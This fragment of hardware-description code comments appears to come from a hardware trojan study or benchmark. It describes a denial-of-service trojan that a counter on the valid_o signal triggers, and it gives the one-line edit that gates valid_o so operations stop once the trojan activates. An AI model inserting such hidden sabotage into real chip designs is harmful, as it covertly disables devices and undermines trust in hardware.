 ...
 * 
 * Description:
 *   Disables operations by blocking valid_o control signal
 *   
 * Trigger: Counter on valid_o
 * Payload: Block valid_o when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block valid_o when trojan is active
//
// IMPORTANT: valid_o is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (valid_o && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: valid_o && 0 = 0 (always false)
//   All operations controlled by valid_o are blocked
